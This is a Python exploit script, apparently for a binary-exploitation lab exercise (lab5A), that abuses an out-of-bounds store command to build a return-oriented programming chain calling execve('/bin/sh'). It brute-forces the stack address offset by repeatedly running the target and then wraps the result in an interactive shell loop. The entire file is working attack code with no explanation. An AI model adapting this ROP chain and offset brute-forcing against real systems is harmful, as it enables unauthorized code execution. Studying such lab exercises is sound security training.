import struct,os
def store(file,number,index):
        file.write(b"store\n")
        file.write(str(number).encode()+b"\n")
        file.write(str(index).encode()+b"\n")
def write_payload(file,offset=0):
        index_of_retn=-11
        index=1
        addr_of_binsh=0xbffff5c4-offset
        #store string
        store(file,1852400175,31) # "/bin"
        store(file,6845231,32) # "/sh"

        store(file,0x8054c30,1)#xor eax,eax; ret
        store(file,0x8096be2,2)#add eax,0xb;pop edi;ret
        store(file,0x807986c,4)#pop ebx; pop esi;pop edi;ret

        store(file,0x80e6255,8)#pop ecx;ret
        store(file,0x0806f3a9,10)#pop ebx;pop edx;ret
        store(file,addr_of_binsh,11)#addr of "/bin/sh"
        store(file,0x8048eaa,13)#int 0x80

        store(file,0x08079869,index_of_retn)#pop pop pop ret
        file.close()
def get_offset():
        for offset in range(1,300):
                write_payload(open("/tmp/5A_payload",'wb'),offset)
                if os.system("/levels/lab05/lab5A < /tmp/5A_payload")!=35584:#os.system will return 35584 if it has an error
                        print("\n[*]Offset=",offset)
                        return offset
                os.system("rm -f /tmp/5A_payload")
def exploit(offset):
        print("Getting shell....")
        write_payload(open("/tmp/5A_payload",'wb'),offset)
        while True:
                cmd=input("$ ")
                out=os.popen("(cat /tmp/5A_payload;echo '{}')|/levels/lab05/lab5A".format(cmd)).read().split("Index:")
                print(out[len(out)-1])
        os.system("rm -f /tmp/5A_payload")
exploit(get_offset())
